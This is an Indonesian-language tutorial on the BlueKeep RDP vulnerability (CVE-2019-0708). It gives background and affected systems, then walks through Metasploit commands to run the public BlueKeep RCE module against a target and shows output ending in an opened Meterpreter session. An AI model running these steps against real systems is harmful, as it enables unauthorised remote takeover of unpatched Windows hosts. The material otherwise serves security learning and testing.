# BlueKeep

## A. Apa itu BlueKeep?

[BlueKeep](https://en.wikipedia.org/wiki/BlueKeep) adalah kerentanan keamanan serius pada Remote Desktop Services (sebelumnya dikenal sebagai Terminal Services) di sistem operasi Windows. Kerentanan ini terdaftar dengan ID `CVE-2019-0708` dan memungkinkan Remote Code Execution (RCE) tanpa autentikasi melalui protokol `RDP` (Remote Desktop Protocol) pada port `3389`.

BlueKeep pertama kali ditemukan oleh [National Security Agency (NSA)](https://www.nsa.gov/) dan [UKâ€™s National Cyber Security Centre (NCSC)](https://www.ncsc.gov.uk/). Microsoft merilis pembaruan darurat pada `Mei 2019`, termasuk untuk sistem yang sudah tidak mendapat dukungan resmi seperti `Windows XP`.

> BlueKeep memiliki kemampuan untuk menyebar sendiri (wormable), mirip dengan `EternalBlue`, dan dianggap sangat berbahaya karena bisa digunakan untuk serangan massal.

## B. Detail Teknis
- CVE ID: `CVE-2019-0708`
- Tanggal Rilis: `14 Mei 2019`
- Tipe: Remote Code Execution (RCE)
- Protokol: `RDP` (Remote Desktop Protocol)
- Komponen: `TermService`
- Platform: `Windows XP`, `Vista`, `7`, `Server 2003`, `Server 2008`, `Server 2008 R2`
- Arsitektur: `x86` dan `x64`
- Skor CVSS: `9.8` (Kritis)

## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `BlueKeep`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-0708](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-0708)

## D. Langkah Penggunaan di Metasploit

1. Jalankan Metasploit:

   ```
   msfconsole
   ```

2. Gunakan Modul Exploit BlueKeep:

   ```
   msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
   ```

3. Setting Parameter Penting:

   ```
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set RHOSTS <IP_TARGET>
   msf6 > set RPORT 3389
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```
   
4. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] 192.168.1.50:3389 - Sent 237/250 MB. (Time elapsed: 00:00:47)
   [*] 192.168.1.50:3389 - Sent 238/250 MB. (Time elapsed: 00:00:47)
   [*] 192.168.1.50:3389 - Sent 239/250 MB. (Time elapsed: 00:00:47)
   [*] 192.168.1.50:3389 - Sent 240/250 MB. (Time elapsed: 00:00:48)
   [*] 192.168.1.50:3389 - Sent 241/250 MB. (Time elapsed: 00:00:48)
   [*] 192.168.1.50:3389 - Sent 242/250 MB. (Time elapsed: 00:00:48)
   [*] 192.168.1.50:3389 - Sent 243/250 MB. (Time elapsed: 00:00:48)
   [*] 192.168.1.50:3389 - Sent 244/250 MB. (Time elapsed: 00:00:48)
   [*] 192.168.1.50:3389 - Sent 245/250 MB. (Time elapsed: 00:00:49)
   [*] 192.168.1.50:3389 - Sent 246/250 MB. (Time elapsed: 00:00:49)
   [*] 192.168.1.50:3389 - Sent 247/250 MB. (Time elapsed: 00:00:49)
   [*] 192.168.1.50:3389 - Sent 248/250 MB. (Time elapsed: 00:00:49)
   [*] 192.168.1.50:3389 - Sent 249/250 MB. (Time elapsed: 00:00:49)
   [*] 192.168.1.50:3389 - Sent 250/250 MB. (Time elapsed: 00:00:50)
   [*] 192.168.1.50:3389 - Forcing the USE of FREE'd object ...
   [!] 192.168.1.50:3389 - <---------------- | Leaving Danger Zone | ---------------->
   [*] Sending stage (203846 bytes) to 192.168.1.50
   [*] Meterpreter session 7 opened (192.168.1.42:4444 -> 192.168.1.50:49159) at 2025-05-15 22:11:42 +0700

   meterpreter >
   ```
   
   Itu artinya kita sudah berhasil mengeksploitasi mesin terget.
